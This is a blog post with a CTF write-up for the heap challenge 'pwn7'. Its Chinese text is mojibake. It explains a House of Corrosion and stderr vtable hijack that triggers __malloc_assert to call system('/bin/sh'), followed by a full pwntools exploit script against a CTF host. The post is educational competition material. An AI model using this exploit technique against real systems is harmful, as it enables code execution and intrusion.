<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œä¹Ÿæ˜¯çœ‹çš„æœ€ä¹…çš„ä¸€é“é¢˜ï¼Œå¯ä»¥é€šè¿‡mmapä¼ªé€ å †å—freeæ”¾åˆ°binä¸Šï¼Œç”±äºä½¿ç”¨çš„æ˜¯calloc,æ‰€ä»¥æ— æ³•ç®€å•çš„ä½¿ç”¨tcacheå®Œæˆæ”»å‡»ï¼Œèƒ½ä½¿ç”¨çš„åªæœ‰largebinattackæ²¡æ³•æ•´ï¼Œåæ¥ç»è¿‡æç¤ºå‘ç°å¯ä»¥ä½¿ç”¨House of Corrosionå®Œæˆä¸€å®šèŒƒå›´çš„ä»»æ„å†™ï¼Œè¿™å°±å¥½åŠå¤šäº†ï¼Œæ§åˆ¶stderrçš„vtableæŒ‡å‘_IO_helper_jumps,ç„¶åä¿®æ”¹ _IO_helper_jumpsåç§»ä¸º0x60çš„å‡½æ•°æŒ‡é’ˆä¸ºsystemï¼Œç„¶åæŠŠstderrçš„å‰å…«ä¸ªå­—èŠ‚æ”¹æˆå­—ç¬¦ä¸²<code>/bin/sh</code>,ç„¶åæ§åˆ¶topchunkåˆ°mmapçš„ç©ºé—´ï¼Œä¿®æ”¹sizeç”³è¯·å †å—è§¦å‘__malloc_assertå‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned <span class="built_in">int</span> line,</span><br><span class="line">       const char *function)</span><br><span class="line">&#123;</span><br><span class="line">(void) __fxprintf (NULL, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (stderr);</span><br><span class="line">abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨fflushä¸­å°±ä¼šè°ƒç”¨stderrä¸­vtableçš„åç§»ä¸º0x60å‡½æ•°æŒ‡é’ˆï¼Œæ­¤æ—¶rdiæŒ‡å‘stderrç»“æ„ä½“ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ï¼Œåç§»ä¸º0x60å‡½æ•°æŒ‡é’ˆä¹Ÿæ˜¯system,æ­¤æ—¶å°±getshelläº†ã€‚</p>
<p>è„šæœ¬æ¯”è¾ƒä¹±ï¼Œå…¶ä¸­å¥½å¤šæ²¡ç”¨ï¼Œæ‰€ä»¥çœ‹èµ·æ¥è¿™ä¹ˆå¤š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26218</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">offset,size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;offset: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x430</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">132</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    <span class="comment"># pay+=p64(0)+p64(0x2b61)</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x420</span>)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show()</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x61</span>-<span class="number">0x1e0c00</span></span><br><span class="line">    stderr_addr=<span class="number">0x1e15e0</span>+libc_addr</span><br><span class="line">    stderr_chain=stderr_addr+<span class="number">0x68</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">130</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x830</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">    mem_addr=u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x820</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">8</span>,p64(libc_addr+<span class="number">0x1e0c00</span>))</span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e1000</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1ed5b0</span>-<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x830</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(mem_addr+<span class="number">0x820</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x820</span>)*<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0x830</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x20</span>)*<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    fake_io_1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_1+=p64(mem_addr+<span class="number">0x1a00</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_1+=p64(mem_addr+<span class="number">0x1e00</span>)+p64(mem_addr+<span class="number">0x1e00</span>+<span class="number">22</span>)</span><br><span class="line">    fake_io_1+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(mem_addr+<span class="number">0x920</span>)</span><br><span class="line">    fake_io_1+=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x1e2560</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x820</span>,<span class="built_in">len</span>(fake_io_1),fake_io_1)</span><br><span class="line"></span><br><span class="line">    fake_io_2=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(mem_addr+<span class="number">0x1a00</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(mem_addr+<span class="number">0x1e00</span>)+p64(mem_addr+<span class="number">0x1e00</span>+<span class="number">22</span>)</span><br><span class="line">    fake_io_2+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x1e2560</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x920</span>,<span class="built_in">len</span>(fake_io_2),fake_io_2)</span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">18</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    free_hook=libc_addr+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    <span class="built_in">next</span>=((mem_addr+<span class="number">0x1030</span>&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(free_hook-<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x8</span>,p64(<span class="built_in">next</span>))</span><br><span class="line">    pay=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    edit(<span class="number">0x1e00</span>,<span class="number">0x18</span>,pay)</span><br><span class="line">    free(<span class="number">0x460</span>)</span><br><span class="line">    add(<span class="number">0x420</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">1</span>)+<span class="string">&#x27;A&#x27;</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;aA&quot;</span>)</span><br><span class="line">    heap_aadr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">130</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1200</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1230</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e0ff0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1e3e78</span>-<span class="number">0x20</span>-<span class="number">3</span>))</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1631</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x651</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line"></span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(<span class="number">0x1e1960</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1620</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1c41</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xc61</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line"></span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1c30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1481</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x4a1</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^<span class="number">0x0068732f6e69622f</span></span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1470</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(mem_addr+<span class="number">0x1220</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x1220</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x1220</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x20</span>)*<span class="number">3</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">22</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">0x1830</span>)</span><br><span class="line">        edit(<span class="number">0x1830</span>,<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0x1830</span>)</span><br><span class="line">    edit(<span class="number">0x1820</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>))</span><br><span class="line">    add(<span class="number">0xffff</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">41</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
